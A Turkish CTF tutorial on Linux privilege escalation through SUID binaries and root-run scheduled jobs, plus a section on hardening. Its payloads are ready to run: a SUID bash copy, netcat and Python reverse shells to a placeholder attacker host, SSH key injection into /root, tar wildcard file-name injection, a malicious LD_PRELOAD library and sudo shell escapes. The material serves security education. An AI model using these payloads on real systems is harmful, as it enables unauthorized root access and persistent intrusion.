# Linux'ta Yetki Yükseltme: SUID, Zamanlanmış Görevler ve Pratik Senaryolar

Bu rehber, Linux sistemlerde sıkça karşılaşılan yetki yükseltme (Privilege Escalation - PrivEsc) tekniklerinden olan SUID bitlerinin kötüye kullanımı ve zamanlanmış görevlerin bu süreçteki rolünü detaylı bir şekilde açıklamaktadır. Özellikle CTF (Capture The Flag) yarışmalarında karşılaşılabilecek senaryolar ve pratik ipuçları üzerinde durulacaktır.

## İçindekiler

1.  [Giriş: Yetki Yükseltme Nedir?](#giriş-yetki-yükseltme-nedir)
2.  [Temel Kavramlar](#temel-kavramlar)
    *   [SUID ve SGID Bitleri](#suid-ve-sgid-bitleri)
        *   [SUID/SGID Nedir?](#suidsgid-nedir)
        *   [Neden Önemlidir ve Nasıl Sömürülür?](#neden-önemlidir-ve-nasıl-sömürülür)
        *   [SUID/SGID Bitine Sahip Dosyaları Bulma](#suidsgid-bitine-sahip-dosyaları-bulma)
    *   [Zamanlanmış Görevler](#zamanlanmış-görevler)
        *   [Cron](#cron)
        *   [Systemd Timers](#systemd-timers)
        *   [Anacron](#anacron)
        *   [Diğer Yöntemler (`at`, init scriptleri)](#diğer-yöntemler-at-init-scriptleri)
3.  [Ana Senaryo: `planner.sh` ile Dolaylı Yetki Yükseltme](#ana-senaryo-plannersh-ile-dolaylı-yetki-yükseltme)
    *   [Senaryo Tanımı](#senaryo-tanımı)
    *   [`planner.sh`'in Potansiyel Zafiyetli İçerikleri](#plannershin-potansiyel-zafiyetli-içerikleri)
    *   [Kontrolümüzdeki `print.sh` İçin Payload Hazırlama](#kontrolümüzdeki-printsh-için-payload-hazırlama)
    *   [`planner.sh`'in Çalışma Sıklığını Tespit Etme](#plannershin-çalışma-sıklığını-tespit-etme)
    *   [Adım Adım Exploit Süreci](#adım-adım-exploit-süreci)
4.  [CTF'lerde İşinizi Kolaylaştıracak İpuçları ve Gelişmiş Teknikler](#ctflerde-işinizi-kolaylaştıracak-ipuçları-ve-gelişmiş-teknikler)
    *   [`PATH` Manipülasyonu](#path-manipülasyonu)
    *   [Wildcard Enjeksiyonu (Örn: `tar`)](#wildcard-enjeksiyonu-örn-tar)
    *   [Paylaşılan Yazılabilir Dizinler ve Betikler](#paylaşılan-yazılabilir-dizinler-ve-betikler)
    *   [`LD_PRELOAD` ile SUID Programlarını Sömürme](#ld_preload-ile-suid-programlarını-sömürme)
    *   [Yanlış Yapılandırılmış `sudo` Hakları](#yanlış-yapılandırılmış-sudo-hakları)
    *   [Dosya Değişikliklerini İzleme (`inotifywait`)](#dosya-değişikliklerini-izleme-inotifywait)
5.  [Örnek CTF Senaryoları (Kısa Özetler)](#örnek-ctf-senaryoları-kısa-özetler)
6.  [Savunma Stratejileri ve Güvenlik Önlemleri](#savunma-stratejileri-ve-güvenlik-önlemleri)
7.  [Faydalı Araçlar ve Kaynaklar](#faydalı-araçlar-ve-kaynaklar)
8.  [Sonuç](#sonuç)

---

## Giriş: Yetki Yükseltme Nedir?

Yetki yükseltme, bir saldırganın veya kullanıcının, başlangıçta sahip olduğu düşük seviyeli erişim haklarını kullanarak sistem üzerinde daha yüksek (genellikle `root` veya yönetici) ayrıcalıklara sahip bir hesaba geçiş yapması sürecidir. Bu, sistemdeki yanlış yapılandırmalardan, yazılım zafiyetlerinden veya tasarım hatalarından kaynaklanabilir. CTF'lerde "root flag"ini ele geçirmek için sıkça başvurulan bir adımdır.

## Temel Kavramlar

### SUID ve SGID Bitleri

#### SUID/SGID Nedir?

*   **SUID (Set User ID):** Bir çalıştırılabilir dosyada SUID biti ayarlandığında, o dosya çalıştırıldığında, dosyanın sahibi olan kullanıcının (genellikle `root`) yetkileriyle çalışır, onu çalıştıran kullanıcının yetkileriyle değil. Örnek: `passwd` komutu, normal kullanıcıların kendi şifrelerini (`/etc/shadow` dosyasına yazarak) değiştirebilmesi için `root` SUID bitine sahiptir.
*   **SGID (Set Group ID):** Benzer şekilde, SGID biti ayarlı bir dosya, dosyanın ait olduğu grubun yetkileriyle çalışır. Bir dizine SGID biti ayarlanırsa, o dizin içinde oluşturulan yeni dosyalar ve alt dizinler, ana dizinin grup sahipliğini miras alır.

#### Neden Önemlidir ve Nasıl Sömürülür?

Eğer `root` kullanıcısına ait bir programda SUID biti ayarlıysa ve bu program:
*   Kullanıcı girdisini güvensiz bir şekilde işliyorsa (örn: komut enjeksiyonu).
*   Tam yolu belirtilmemiş başka bir komutu çağırıyorsa (`PATH` manipülasyonuna açık).
*   Kullanıcının yazabildiği bir dosyayı okuyor/yazıyorsa.
*   Bilinen bir zafiyete (örn: buffer overflow) sahipse.
Bu durumlar, `root` yetkilerine erişim için bir kapı aralayabilir.

#### SUID/SGID Bitine Sahip Dosyaları Bulma

```bash
# SUID bitine sahip dosyaları bulma (root kullanıcısına ait olanlar genellikle daha ilginçtir)
find / -type f -user root -perm -u=s -ls 2>/dev/null
find / -type f -perm -4000 -ls 2>/dev/null # Alternatif

# SGID bitine sahip dosyaları bulma
find / -type f -perm -g=s -ls 2>/dev/null
find / -type f -perm -2000 -ls 2>/dev/null # Alternatif

# Hem SUID hem de SGID bitine sahip dosyaları bulma
find / -type f \( -perm -u=s -o -perm -g=s \) -ls 2>/dev/null
```
CTF'lerde genellikle `/usr/bin`, `/usr/sbin` dışındaki, özel olarak yerleştirilmiş SUID'li dosyalar veya standart araçların beklenmedik SUID konfigürasyonları hedef olur.

### Zamanlanmış Görevler

Zamanlanmış görevler, belirli komutların veya betiklerin periyodik olarak ya da belirli bir zamanda otomatik çalıştırılmasını sağlar. Eğer `root` yetkileriyle çalışan bir zamanlanmış görev, düşük yetkili bir kullanıcının kontrol edebileceği bir dosyayı veya girdiyi kullanıyorsa, bu bir yetki yükseltme vektörü olabilir.

#### Cron

En yaygın zamanlama aracıdır.
*   **Sistem Geneli Cron Tablosu:** `/etc/crontab`
    ```bash
    sudo cat /etc/crontab
    # Örnek satır: */5 * * * * root /path/to/script.sh
    ```
*   **Kullanıcıya Özel Cron Tabloları:** Genellikle `/var/spool/cron/crontabs/<kullanıcıadı>` altında saklanır.
    ```bash
    # Mevcut kullanıcının cron'u
    crontab -l
    # Başka bir kullanıcının cron'unu listeleme (root veya sudo yetkisiyle)
    sudo crontab -u <kullanıcı_adı> -l
    ```
*   **`/etc/cron.d/` Dizini:** Paketlerin veya uygulamaların kendi cron işlerini eklemesi için kullanılır. `/etc/crontab` ile aynı formatı kullanır.
    ```bash
    ls -l /etc/cron.d/
    sudo cat /etc/cron.d/some_job
    ```
*   **`/etc/cron.hourly/`, `cron.daily/`, `cron.weekly/`, `cron.monthly/`:** Bu dizinlere konulan çalıştırılabilir betikler periyodik olarak çalıştırılır.
    ```bash
    ls -l /etc/cron.daily/
    ```

#### Systemd Timers

Modern Linux dağıtımlarında cron'a alternatif olarak kullanılır. `.timer` (ne zaman) ve `.service` (ne çalışacak) dosyalarından oluşur.
```bash
# Aktif ve inaktif tüm timer'ları listeleme
systemctl list-timers --all

# Bir timer'ın içeriğini görme
systemctl cat somejob.timer
# Örnek: OnCalendar=*:0/10 (Her 10 dakikada bir)

# Timer'ın tetiklediği servisin içeriğini görme
systemctl cat somejob.service
# Örnek: ExecStart=/path/to/script.sh
```

#### Anacron

Sürekli çalışmayan sistemler için tasarlanmıştır. Sistem açıldığında, kaçırılan cron işlerini çalıştırır. Yapılandırma dosyası genellikle `/etc/anacrontab`'dır.

#### Diğer Yöntemler (`at`, init scriptleri)

*   **`at` Komutu:** Belirli bir zamanda yalnızca bir kez çalışacak görevleri planlar.
    ```bash
    atq # Kuyruktaki işleri listeler
    ```
*   **Init Scriptleri (SystemV, Upstart):** `/etc/init.d/` veya `/etc/event.d/` gibi dizinlerde bulunan betikler, sistem başlangıcında veya belirli olaylarda çalışabilir. Nadiren doğrudan periyodik görevler için kullanılırlar ama dolaylı yollardan tetiklenebilirler.

---

## Ana Senaryo: `planner.sh` ile Dolaylı Yetki Yükseltme

Bu bölümde, SUID biti ve zamanlanmış görevlerin birleştiği klasik bir CTF senaryosunu inceleyeceğiz.

### Senaryo Tanımı

*   **Kullanıcı:** `cihan` (düşük yetkili)
*   **Düzenlenebilir Dosya:** `/home/cihan/print.sh` (sahibi `cihan`, yazma izni var)
*   **Zamanlanmış Betik:** `/opt/scripts/planner.sh` (sahibi `root`, `cihan` okuyabilir ama yazamaz). Bu betik, `root` yetkileriyle periyodik olarak çalışır.
*   **Hedef:** `cihan` kullanıcısı, `print.sh` dosyasını manipüle ederek sistemde `root` yetkilerine sahip olmak. Bu genellikle `planner.sh`'in `print.sh`'i `root` context'inde çalıştırmasıyla veya `print.sh`'in `root` olarak çalışan `planner.sh`'e komut enjekte etmesiyle mümkün olur. Nihai amaç, `/bin/bash` gibi bir kabuğa SUID biti eklemek veya tersine bağlantı almak olabilir.

### `planner.sh`'in Potansiyel Zafiyetli İçerikleri

`planner.sh` betiğinin `root` olarak çalışması ve `print.sh`'i güvensiz bir şekilde işlemesi kritik noktadır.

**Zafiyetli Örnek 1: Doğrudan çalıştırma veya `source` kullanımı**
```bash
#!/bin/bash
# /opt/scripts/planner.sh (root olarak çalışır)

USER_SCRIPT="/home/cihan/print.sh"

if [ -f "$USER_SCRIPT" ]; then
    echo "Kullanıcı betiği çalıştırılıyor: $USER_SCRIPT"
    /bin/bash "$USER_SCRIPT"  # VEYA DAHA KÖTÜSÜ:
    # source "$USER_SCRIPT"
    # . "$USER_SCRIPT"
fi
```
Bu durumda, `$USER_SCRIPT` içindeki komutlar `planner.sh`'in (yani `root`'un) yetkileriyle çalışır.

**Zafiyetsiz (veya daha zor sömürülebilir) Örnek:**
```bash
#!/bin/bash
# /opt/scripts/planner.sh (root olarak çalışır)

USER_SCRIPT="/home/cihan/print.sh"

if [ -f "$USER_SCRIPT" ]; then
    echo "Kullanıcı betiği cihan olarak çalıştırılıyor: $USER_SCRIPT"
    sudo -u cihan /bin/bash "$USER_SCRIPT"
fi
```
Burada `print.sh`, `cihan` kullanıcısının yetkileriyle çalışacağı için doğrudan SUID biti ekleme işe yaramaz. Ancak, `sudo -u cihan` komutunun kendisinde bir zafiyet varsa veya `cihan`'ın `sudo` hakları yanlış yapılandırılmışsa dolaylı yollar bulunabilir.

### Kontrolümüzdeki `print.sh` İçin Payload Hazırlama

Eğer `planner.sh` zafiyetli bir şekilde `print.sh`'i `root` olarak çalıştırıyorsa, `print.sh`'e şunları yazabiliriz:

**Payload 1: /bin/bash Kopyasına SUID Biti Verme (Önerilen)**
```bash
#!/bin/bash
# /home/cihan/print.sh

# /bin/bash'in bir kopyasını oluşturup ona SUID biti verelim
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash # Sahibi root olmalı
chmod u+s /tmp/rootbash       # SUID biti ekle
```
*Neden kopya?* Bazı sistemler `/bin/bash`'e doğrudan SUID biti verilmesini engelleyebilir veya beklenmedik davranışlara yol açabilir. Ayrıca, orijinal dosyayı değiştirmemek daha "sessiz" bir yöntemdir.

**Payload 2: Tersine Bağlantı (Reverse Shell)**
```bash
#!/bin/bash
# /home/cihan/print.sh

attacker_ip="YOUR_ATTACKER_IP"
attacker_port="YOUR_ATTACKER_PORT"

# Basit bir netcat reverse shell
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc $attacker_ip $attacker_port > /tmp/f

# Daha stabil olabilecek Python reverse shell
# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_ATTACKER_IP",YOUR_ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
*Not:* Tersine bağlantı için saldırgan makinede `nc -lvnp YOUR_ATTACKER_PORT` ile dinleyici başlatılmalıdır.

**Payload 3: SSH Anahtarı Ekleme**
```bash
#!/bin/bash
# /home/cihan/print.sh

SSH_PUBLIC_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ..." # Kendi public key'iniz

mkdir -p /root/.ssh
echo "$SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
# chown -R root:root /root/.ssh # Gerekirse sahipliği de düzelt
```

### `planner.sh`'in Çalışma Sıklığını Tespit Etme

Payload'ı yerleştirdikten sonra ne zaman tetikleneceğini bilmek önemlidir.
1.  **Cron Dosyalarını İnceleme:** (Yukarıda detayları verildi)
    *   `cat /etc/crontab`
    *   `sudo crontab -u root -l` (veya `planner.sh`'i çalıştıran başka bir kullanıcı)
    *   `ls -l /etc/cron.d/ ; cat /etc/cron.d/*planner*`
2.  **Systemd Timer'ları Kontrol Etme:** (Yukarıda detayları verildi)
    *   `systemctl list-timers --all | grep planner`
    *   `systemctl cat planner.timer` (eğer varsa)
3.  **Log Analizi:**
    *   `grep planner.sh /var/log/syslog` (veya `/var/log/cron.log`, `/var/log/auth.log`)
    *   `journalctl -u planner.service` (eğer systemd servisi ise)
    *   `journalctl | grep planner.sh`
    *   Eğer `planner.sh` kendi log dosyasını tutuyorsa (örn: `/var/log/planner.log`), onu inceleyin. Zaman damgaları çalışma sıklığını verir.
4.  **Proses İzleme Araçları (Örn: `pspy`):** CTF'lerde çok etkilidir. Sistemdeki proses oluşturma olaylarını anlık olarak izler.
    *   `pspy` (https://github.com/DominicBreuker/pspy) hedef makineye yüklenir.
    *   `./pspy64` (64-bit sistemler için) çalıştırılır. `planner.sh`'in periyodik olarak çalıştığını gösteren çıktılar aranır.
5.  **Dosya Değişiklik Zamanları:** Eğer `planner.sh` belirli bir dosyayı (örn: log dosyası, geçici dosya) her çalıştığında güncelliyorsa, bu dosyanın son değişiklik zamanı (`ls -l <dosya>`) ipucu verebilir.
    ```bash
    watch -n 1 'ls -l /var/log/planner.log' # 1 saniyede bir dosya durumunu izle
    ```

### Adım Adım Exploit Süreci

1.  **Keşif:**
    *   `cihan` kullanıcısının `/home/cihan/print.sh`'e yazabildiğini doğrula.
    *   `/opt/scripts/planner.sh` dosyasını oku (izin varsa) ve `print.sh`'i nasıl çalıştırdığını anla.
    *   Yukarıdaki yöntemlerle `planner.sh`'in ne sıklıkta ve kimin (ideal olarak `root`) tarafından çalıştırıldığını tespit et.
2.  **Payload Hazırlama:** `/home/cihan/print.sh` dosyasının içeriğini seçtiğin bir payload ile (örn: SUID bash kopyası) düzenle.
3.  **Bekleme:** `planner.sh`'in bir sonraki çalışma zamanını bekle. Tespit ettiğin sıklığa göre bu birkaç saniye veya saat olabilir.
4.  **Doğrulama ve Yetki Yükseltme (SUID Payload'ı için):**
    *   `planner.sh` çalıştıktan sonra, `/tmp/rootbash` dosyasının SUID bitinin ayarlandığını ve sahibinin `root` olduğunu kontrol et:
        ```bash
        ls -l /tmp/rootbash
        # Çıktı: -rwsr-xr-x 1 root root ... /tmp/rootbash  (s harfi SUID'i gösterir)
        ```
    *   Eğer SUID biti ayarlanmışsa, `root` olmak için çalıştır:
        ```bash
        /tmp/rootbash -p
        # '-p' bayrağı, effective UID'yi korumasını sağlar (privileged mode).
        whoami
        # Çıktı: root
        id
        # Çıktı: uid=1000(cihan) gid=1000(cihan) euid=0(root) ...
        ```
        Artık `root` yetkilerine sahipsin!

---

## CTF'lerde İşinizi Kolaylaştıracak İpuçları ve Gelişmiş Teknikler

*   **`PATH` Manipülasyonu:**
    Eğer `root` olarak çalışan bir betik (örn: `planner.sh` veya SUID'li bir program) komutları tam yolunu belirtmeden çağırıyorsa (örn: `service apache2 start` yerine sadece `service`) ve siz `PATH` değişkenini etkileyebiliyorsanız, bu durumu sömürebilirsiniz.
    ```bash
    # print.sh içinde (eğer planner.sh source ile çalıştırıyorsa veya PATH'i etkiliyorsa)
    export PATH=.:$PATH # Mevcut dizini PATH'in başına ekle
    # Ardından mevcut dizine (örn: /home/cihan/) "service" adında zararlı bir betik oluşturun.
    # /home/cihan/service:
    # #!/bin/bash
    # cp /bin/bash /tmp/rootbash2
    # chmod u+s /tmp/rootbash2
    ```

*   **Wildcard Enjeksiyonu (Örn: `tar`):**
    Eğer `planner.sh` gibi `root` betiği, sizin kontrolünüzdeki bir dizinde wildcard (`*`) ile bir komut çalıştırıyorsa (örn: `tar czf /backups/cihan_home.tar.gz /home/cihan/*`), dosya isimlerini kullanarak komut enjeksiyonu yapabilirsiniz.
    `tar` için:
    ```bash
    # /home/cihan/ dizininde:
    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=bash -c 'cp /bin/bash /tmp/wildcard_bash; chmod u+s /tmp/wildcard_bash'"
    # planner.sh bir sonraki çalışmasında tar bu seçenekleri komut olarak algılayacaktır.
    ```
    Diğer komutlar için (örn: `chown`, `chmod`) benzer teknikler GTFOBins'de bulunabilir.

*   **Paylaşılan Yazılabilir Dizinler ve Betikler:**
    Bazen `/tmp`, `/var/tmp`, `/dev/shm` gibi herkesin yazabildiği dizinlerde `root` tarafından çalıştırılan veya okunan betikler/konfigürasyon dosyaları bulunabilir. Veya, bir web sunucusunun döküman kökünde (`/var/www/html`) `root` tarafından çalıştırılan bir `cleanup.php` olabilir ve siz bu dosyayı değiştirebilirsiniz.

*   **`LD_PRELOAD` ile SUID Programlarını Sömürme:**
    Eğer `root` SUID bitine sahip bir program, paylaşılan kütüphaneleri dinamik olarak yüklüyorsa ve siz `LD_PRELOAD` ortam değişkenini ayarlayabiliyorsanız (genellikle SUID programlar için bu kısıtlıdır, ama bazı istisnalar veya yanlış yapılandırmalar olabilir), kendi derlediğiniz zararlı bir `.so` dosyasını programa yükletebilirsiniz.
    1.  Zararlı C kodu yaz (örn: `shell.c`):
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/types.h>
        #include <unistd.h>

        void _init() {
            unsetenv("LD_PRELOAD");
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
        }
        ```
    2.  Derle: `gcc -shared -o shell.so -fPIC shell.c`
    3.  Eğer `planner.sh` SUID'li bir programı çalıştırırken `LD_PRELOAD`'u etkileyebiliyorsanız:
        ```bash
        # print.sh içinde
        export LD_PRELOAD=/home/cihan/shell.so
        # Ardından planner.sh SUID'li programı çalıştırdığında shell.so yüklenecektir.
        ```
    Bu senaryo daha nadirdir ama güçlü bir tekniktir.

*   **Yanlış Yapılandırılmış `sudo` Hakları:**
    Bazen `planner.sh` doğrudan `print.sh`'i `root` olarak çalıştırmaz ama `cihan` kullanıcısına belirli komutları `sudo` ile şifresiz çalıştırma hakkı verilmiş olabilir.
    ```bash
    sudo -l # cihan kullanıcısının sudo haklarını gösterir
    # Çıktı örneği:
    # (root) NOPASSWD: /usr/bin/find
    ```
    Eğer `find` gibi komutlar `sudo` ile şifresiz çalıştırılabiliyorsa, GTFOBins'den `sudo` bölümüne bakarak bu komutlarla nasıl shell alınacağı bulunabilir.
    ```bash
    # print.sh içinde (eğer planner.sh bunu cihan olarak çalıştırıyorsa)
    sudo /usr/bin/find . -exec /bin/bash -p \; -quit
    ```

*   **Dosya Değişikliklerini İzleme (`inotifywait`):**
    `planner.sh`'in tam olarak ne zaman çalıştığını veya hangi dosyalara dokunduğunu anlamak için `inotify-tools` paketindeki `inotifywait` kullanılabilir.
    ```bash
    # /opt/scripts dizinindeki değişiklikleri izle
    inotifywait -m /opt/scripts
    # Çıktı, planner.sh erişildiğinde veya değiştirildiğinde bilgi verir.
    ```

---

## Örnek CTF Senaryoları (Kısa Özetler)

1.  **Senaryo: `source` ile Çalıştırma**
    *   `planner.sh` (`root`): `source /home/user/config.sh`
    *   `/home/user/config.sh` (kullanıcı yazabilir): İçine reverse shell veya SUID payload'ı eklenir. `planner.sh` çalıştığında payload `root` olarak çalışır.

2.  **Senaryo: Wildcard ile Betik Çalıştırma**
    *   `planner.sh` (`root`): `for SCRIPT in /opt/user_scripts/*.sh; do bash $SCRIPT; done`
    *   Kullanıcı `/opt/user_scripts/` dizinine yazabilir. `*` wildcard'ı nedeniyle, `--payload.sh` gibi dosya isimleri veya sembolik linklerle beklenmedik davranışlar tetiklenebilir. Veya direkt zararlı bir `.sh` dosyası eklenir.

3.  **Senaryo: SUID Program ve `PATH`**
    *   SUID `root` programı `/usr/local/bin/custom_tool` var.
    *   `planner.sh` (`root`) periyodik olarak `custom_tool argument` komutunu çalıştırıyor.
    *   `custom_tool` içinde `system("cleanup_script")` gibi bir çağrı var (tam yol belirtilmemiş).
    *   Kullanıcı, `planner.sh`'in çalıştığı ortamda `PATH`'i etkileyebiliyor veya `cleanup_script`'in aranacağı bir dizine yazabiliyor. Sahte `cleanup_script` oluşturularak `root` shell alınır.

4.  **Senaryo: Yanlış İzinli Log Dosyası**
    *   `planner.sh` (`root`) loglarını `/var/log/planner_app.log`'a yazıyor.
    *   `/var/log/planner_app.log` dosyasına `cihan` kullanıcısının yazma izni var (yanlışlıkla).
    *   `planner.sh` log dosyasına yazdığı bir satırı daha sonra okuyup bir komutun parçası olarak kullanıyor.
    *   `cihan`, log dosyasına komut enjeksiyonu yapacak şekilde bir satır ekler. `planner.sh` bu satırı okuduğunda komut çalışır. (Örn: `echo 'evil_command # $(date)' >> /var/log/planner_app.log`)

---

## Savunma Stratejileri ve Güvenlik Önlemleri

Bu tür zafiyetlerden korunmak için sistem yöneticileri şunlara dikkat etmelidir:

*   **En Az Yetki Prensibi:** Betikler ve programlar, sadece gerekli olan en düşük yetkilerle çalıştırılmalıdır. `root` olarak çalışması gerekmeyen hiçbir şey `root` olarak çalıştırılmamalıdır.
*   **Girdi Doğrulama ve Sanitizasyon:** Kullanıcının kontrol edebileceği dosya veya girdileri çalıştıran/kullanan betikler, bu girdileri dikkatle sanitize etmeli veya yetkileri düşürerek (`sudo -u <kullanıcı>`) işlemelidir.
*   **SUID/SGID Biti Denetimi:** SUID/SGID bitine sahip dosyalar düzenli olarak denetlenmeli, gereksiz olanlar kaldırılmalı veya izinleri düzeltilmelidir. Özellikle betiklere (shell, python vb.) SUID biti verilmemelidir.
*   **Güvenli `PATH` Kullanımı:** Betiklerde ve programlarda komutlar tam yollarıyla çağrılmalıdır (örn: `/bin/tar` yerine `tar` değil). Ortam değişkenlerinin güvenli olduğundan emin olunmalıdır.
*   **Zamanlanmış Görevlerin Denetimi:** Cron işleri, systemd timer'ları ve diğer zamanlanmış görevler düzenli olarak gözden geçirilmeli, gereksiz veya güvensiz olanlar kaldırılmalıdır.
*   **Dosya İzinleri:** Kullanıcıların yazmaması gereken dosya ve dizinlere yazma izni verilmemelidir.
*   **Düzenli Log İzleme ve Denetim:** Anormal aktiviteler için sistem logları (syslog, auth.log, journalctl) ve uygulama logları düzenli olarak izlenmelidir.

---

## Faydalı Araçlar ve Kaynaklar

*   **`pspy`:** https://github.com/DominicBreuker/pspy (Proses izleme)
*   **`LinPEAS`:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS (Linux Privilege Escalation Awesome Script)
*   **`LinEnum`:** https://github.com/rebootuser/LinEnum (Linux enumeration script)
*   **GTFOBins:** https://gtfobins.github.io/ (Unix binary'leri ile yetki yükseltme, shell alma vb.)
*   **HackTricks:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation (Kapsamlı PrivEsc rehberi)
*   **`inotify-tools`:** Dosya sistemi olaylarını izlemek için (`apt install inotify-tools`)

---

## Sonuç

SUID bitleri ve zamanlanmış görevler, Linux sistemlerde yetki yükseltme için sıkça karşılaşılan vektörlerdir. Bu mekanizmaların nasıl çalıştığını, nasıl sömürülebileceğini ve nasıl tespit edileceğini anlamak, CTF oyuncuları ve siber güvenlik uzmanları için kritik öneme sahiptir. Her zaman dikkatli keşif yapın, izinleri kontrol edin ve sistemin nasıl çalıştığını anlamaya çalışın.
